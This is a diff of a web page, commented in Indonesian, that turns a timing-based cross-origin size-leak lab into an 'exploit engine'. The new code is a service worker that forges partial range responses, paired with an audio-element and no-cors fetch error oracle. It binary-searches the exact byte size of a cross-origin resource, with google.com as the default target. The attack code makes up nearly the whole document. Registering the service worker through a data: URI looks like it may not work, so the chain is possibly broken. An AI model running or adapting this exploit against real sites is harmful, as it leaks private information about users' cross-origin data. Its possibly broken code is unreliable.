@@ -3,20 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Cross-Origin Size Leak Laboratory</title>
+    <title>Cross-Origin Size Leak Exploit Engine</title>
     <style>
-        *{font-family:'Courier New', monospace;color:#3b3b3b;box-sizing:border-box;}
+        *{font-family:'Courier New', monospace;box-sizing:border-box;}
         body{background:#040406;color:#00ffaa;padding:25px;}
-        #result{max-width:750px;overflow-y:hidden;overflow-x:hidden}
-        #result p{font-weight:300;padding:10px 14px;margin:6px 0;max-width:730px;border-radius:4px;line-height:1.5;}
+        #result{max-width:750px;}
+        #result p{padding:10px 14px;margin:6px 0;border-radius:4px;font-size:12px;line-height:1.4;}
         iframe, audio{width:1px;height:1px;border:0;opacity:0;position:absolute;}
-        small{color:#888;font-weight:400;font-style:italic;font-size:14px;margin-top:-5px;display:block;margin-bottom:30px}
-        small strong{font-weight:600;font-size:16px;color:#00ffaa}
-        input{width:515px;font-size:16px;padding:12px 16px;border:1px solid #00ffaa;border-radius:6px;margin:3px;margin-left:0;background:#111;color:#fff;}
-        button{font-size:16px;padding:12px 16px;border-radius:6px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;margin:3px;margin-left:0;margin-bottom:20px;font-weight:bold;text-transform:uppercase;}
+        input{width:515px;font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#111;color:#fff;}
+        button{font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;font-weight:bold;text-transform:uppercase;}
         button:hover{background:#00ffaa;color:#000;box-shadow:0 0 15px #00ffaa;}
-        h1{margin-top:10px;color:#00ffaa;text-transform:uppercase;letter-spacing:1px;font-size:24px;}
-        .panel{border:1px solid #00ffaa;padding:20px;margin-bottom:15px;background:#010604;border-radius:6px;}
+        .panel{border:1px solid #00ffaa;padding:20px;margin-bottom:15px;background:#010604;}
         .success{background:#05140f;color:#00ffaa;border:1px solid #00ffaa;}
         .error{background:#1f0f0f;color:#ff3333;border:1px solid #ff3333;}
         .info{background:#0a141d;color:#00aaff;border:1px solid #00aaff;}
@@ -24,14 +21,13 @@
 </head>
 <body>
     
-    <h1>Cross-origin size leak</h1>
-    <small>Engine: <strong>Hardened Statistical Parallel Probing (Anti-Jitter)</strong></small>
+    <h2>Cross-Origin Size Leak Exploit Engine</h2>
 
     <div class="panel">
         <form id="form" onsubmit="return false;">
-          <input name="url" id="target-url" value="https://www.google.com/robots.txt"/>
-          <button type="button" id="btn-run">Execute Full Chain Attack</button>
-          <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Technical Report (.TXT)</button>
+          <input name="url" id="target-url" value="https://google.com"/>
+          <button type="button" id="btn-run">Execute Full Chain Exploit</button>
+          <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Exploit Log (.TXT)</button>
         </form>
     </div>
 
@@ -39,8 +35,7 @@
 
     <script>
         const result = document.getElementById("result");
-        const form = document.getElementById("form");
-        let auditReports = [];
+        let auditReports = []; 
 
         function writeLog(phase, type, text) {
             const timestamp = new Date().toLocaleTimeString();
@@ -49,111 +44,128 @@
             result.scrollTop = result.scrollHeight;
         }
 
-        // PIPELINE UTAMA: PARALEL SINKRON DENGAN STATISTICAL CONSENSUS FILTERING
-        const startAdaptiveScan = async (url) => {
-            writeLog('CALIBRATE', 'info', "Melakukan sampling latensi dasar nirkabel untuk stabilisasi ambang batas...");
-            
-            // Mengambil 3 sampel latensi dasar untuk memotong derau jaringan acak
-            const baselineSamples = await Promise.all([
-                measureLatency(`${url}?calibrate=${Math.random()}`),
-                measureLatency(`${url}?calibrate=${Math.random()}`),
-                measureLatency(`${url}?calibrate=${Math.random()}`)
-            ]);
-            
-            // Ambil nilai minimum dari sampel sebagai baseline murni (kondisi jaringan tercepat)
-            const stableBaseline = Math.min(...baselineSamples);
-            // Menetapkan ambang batas toleransi adaptif yang ketat (+12%)
-            const adaptiveThreshold = Math.round(stableBaseline * 1.12);
-            
-            writeLog('CALIBRATE', 'info', `   |-- Latensi Dasar Stabil : ${Math.round(stableBaseline)} ms`);
-            writeLog('CALIBRATE', 'info', `   |-- Ambang Batas Filter  : > ${adaptiveThreshold} ms`);
-            
-            let minSize = 1;
-            let maxSize = 15000; 
+        // 1. ANCHOR: ENKAPSULASI KODE SERVICE WORKER UTK MANIPULASI TIMING JARINGAN
+        const rawWorkerScript = `
+            'use strict';
+            let cachedResponse;
+            self.addEventListener("install", () => { self.skipWaiting(); });
+            self.addEventListener("activate", (e) => { e.waitUntil(self.clients.claim()); });
+            self.addEventListener("fetch", async (e) => {
+                if (!e.request.url.includes('size=')) return;
+                
+                let url = new URL(e.request.url);
+                let urlParams = new URLSearchParams(url.search);
+                let size = urlParams.get("size");
+                let fakeBody = "A".repeat(Number(size));
+
+                // Mencegat permintaan awal dari elemen media
+                if (e.request.headers.get("range") === "bytes=0-") {
+                    e.respondWith(new Response(fakeBody, {status: 206, headers: {
+                        "Content-Type": "audio/mp4",
+                        "Content-Range": "bytes 0-1/13337"
+                    }}));
+                } else if (e.request.headers.get("range") === "bytes=" + Number(size) + "-") {
+                    // Meneruskan permintaan fragmen sisa ke server target lintas asal
+                    cachedResponse = await fetch(e.request);
+                } else if (e.request.url.includes("/mock.css")) {
+                    // Menyajikan salinan respons untuk pengujian status oleh Oracle
+                    e.respondWith(cachedResponse.clone());
+                }
+            });
+        `;
+
+        // Registrasi Service Worker via skema Base64 Data-URI
+        if ("serviceWorker" in navigator) {
+            const base64Script = btoa(unescape(encodeURIComponent(rawWorkerScript)));
+            const dataUriWorker = `data:text/javascript;base64,${base64Script}`;
+
+            navigator.serviceWorker.register(dataUriWorker).then(registration => {
+                if (!navigator.serviceWorker.controller) {
+                    writeLog('SW_ENGINE', 'info', "Sinkronisasi subsistem memori worker... Memperbarui halaman.");
+                    setTimeout(() => { location.reload(); }, 250);
+                }
+            }).catch(err => {
+                console.error("Gagal mendaftarkan Base64 Service Worker: ", err);
+            });
+        }
+
+        // 2. CORE ENGINE: ALGORITMA PIPELINE PENCARIAN BINER UTK METADATA BYTES
+        const runExploitChain = async (url, minSize, maxSize) => {
             let foundSize = -1;
+            document.getElementById("export-log-report").style.display = "none";
+            
+            if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {
+                writeLog('EXPLOIT_ERR', 'error', "Rantai terputus: Kontroler Service Worker tidak aktif pada domain ini.");
+                return;
+            }
 
-            writeLog('SCAN_INIT', 'success', "Meluncurkan pipa komputasi biner paralel...");
-
+            writeLog('EXPLOIT_INIT', 'info', "Saluran pipa otonom aktif. Mengeksekusi interupsi logika resource_loader.cc...");
+            
             while (minSize <= maxSize) {
                 let mid = Math.floor((minSize + maxSize) / 2);
                 
-                // PENGUATANV VECTOR: Kirim 3 paket tebakan sekaligus secara beriringan (Concurrency Testing)
-                const probeSamples = await Promise.all([
-                    measureLatency(`${url}?size=${mid}&cb=${Math.random()}`),
-                    measureLatency(`${url}?size=${mid}&cb=${Math.random()}`),
-                    measureLatency(`${url}?size=${mid}&cb=${Math.random()}`)
-                ]);
-
-                // Ambil nilai median tengah untuk membuang pencilan lonjakan internet (Anti-Jitter)
-                probeSamples.sort((a, b) => a - b);
-                let filteredLatency = probeSamples[1];
-
-                // Aturan Keputusan Saluran Samping (Side-Channel Decision Logic):
-                if (filteredLatency > adaptiveThreshold) {
-                    writeLog(`MID-${mid}`, 'error', `Vektor Analisis: Kapasitas dokumen terindikasi melampaui ${mid} bytes [${Math.round(filteredLatency)}ms].`);
+                // Menjalankan pengecekan status logika sekuensial
+                let isAtLeastMid = await evaluateOpaqueOracle(url, mid);
+                
+                if (isAtLeastMid) {
+                    writeLog(`MID_${mid}`, 'error', `Vektor Penetrasi: Mengonfirmasi kapasitas data melampaui ukuran tebakan ${mid} bytes.`);
                     foundSize = mid + 1;
                     minSize = mid + 1;
                 } else {
-                    writeLog(`MID-${mid}`, 'success', `Vektor Analisis: Kapasitas dokumen berada di bawah ${mid} bytes [${Math.round(filteredLatency)}ms].`);
+                    writeLog(`MID-${mid}`, 'success', `Vektor Penetrasi: Mengonfirmasi kapasitas data berada di bawah ukuran tebakan ${mid} bytes.`);
                     maxSize = mid - 1;
                 }
-
-                // Jeda mikro memberikan ruang bagi engine untuk melakukan garbage collection memori DOM
-                await new Promise(r => setTimeout(r, 15));
+                
+                await new Promise(r => setTimeout(r, 20));
             }
-            
-            writeLog('SUCCESS', 'success', `=== RANTAI EKSPLOITASI SELESAI ===`);
-            writeLog('SUCCESS', 'success', `Kapasitas ukuran byte pasti dari dokumen target: <b>${foundSize}</b> bytes.`);
+            writeLog('SUCCESS', 'success', "=== EXECUTE FULL CHAIN EXPLOIT COMPLETE ===");
+            writeLog('SUCCESS', 'success', `Metadata rahasia bocor. Ukuran pasti dokumen target: <b>${foundSize}</b> bytes.`);
             document.getElementById("export-log-report").style.display = "inline-block";
         };
 
-        // MESIN PROBE: High-Precision Performance Mark Binding
-        const measureLatency = (targetUrl) => {
+        // 3. EXPLOTATION INTERACTION VECTOR: INTERUPSI VALIDASI LOGIKA (ORACLE ENGINE)
+        const evaluateOpaqueOracle = (url, size) => {
             return new Promise((resolve) => {
-                const startMark = performance.now();
-                let audioNode = document.createElement("audio");
-
-                const grabMetrics = () => {
-                    const entries = performance.getEntriesByName(targetUrl);
-                    // Ambil durasi presisi dari Performance Timeline, jika terhambat CORS gunakan fallback delta waktu runtime
-                    const duration = entries.length > 0 ? entries[0].duration : (performance.now() - startMark);
-                    
-                    cleanup(audioNode);
-                    resolve(duration);
+                let soundNode = document.createElement("audio");
+                
+                const clearLifecycleAndResolve = (evaluationResult) => {
+                    if (soundNode) {
+                        soundNode.src = ""; 
+                        soundNode.onerror = null;
+                        soundNode.remove();
+                        soundNode = null; 
+                    }
+                    resolve(evaluationResult);
                 };
 
-                // Mengunci seluruh titik interupsi event agar data waktu tetap terekstrak
-                audioNode.onerror = grabMetrics;
-                audioNode.onstalled = grabMetrics;
-                audioNode.onabort = grabMetrics;
-
-                document.body.appendChild(audioNode);
-                audioNode.src = targetUrl;
+                soundNode.onerror = async () => {
+                    try {
+                        // Memanggil berkas maket lintas asal untuk membaca pengecekan keamanan peramban
+                        // Jika status 416 (Target < Size): Pengecekan dilompati -> fetch berhasil -> memicu resolve(false)
+                        // Jika status 206 (Target > Size): Pengecekan memicu AccessCheckError -> fetch gagal -> masuk catch -> memicu resolve(true)
+                        await fetch("/mock.css?size=" + size + "&cb=" + Math.random(), { mode: "no-cors" });
+                        clearLifecycleAndResolve(false);
+                    } catch(err) {
+                        clearLifecycleAndResolve(true);
+                    }
+                };
+                
+                document.body.appendChild(soundNode);
+                soundNode.src = `${url}?size=${size}&cb=${Math.random()}`;
             });
         };
 
-        function cleanup(element) {
-            if (element) {
-                element.src = "";
-                element.onerror = null;
-                element.onstalled = null;
-                element.onabort = null;
-                element.remove();
-            }
-        }
-
         document.getElementById("btn-run").addEventListener("click", () => {
             let url = document.getElementById("target-url").value.trim();
-            if (window.performance) { performance.clearResourceTimings(); }
             result.innerHTML = "";
-            startAdaptiveScan(url);
+            runExploitChain(url, 1, 15000);
         });
 
         document.getElementById("export-log-report").addEventListener("click", () => {
             if (auditReports.length === 0) return;
             const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
             const downloadAnchor = document.createElement("a");
-            downloadAnchor.download = `hardened_timing_leak_report_${Date.now()}.txt`;
+            downloadAnchor.download = `exploit_fullchain_report_${Math.round(Date.now()/1000)}.txt`;
             downloadAnchor.href = window.URL.createObjectURL(textBlob);
             downloadAnchor.style.display = "none";
             document.body.appendChild(downloadAnchor);
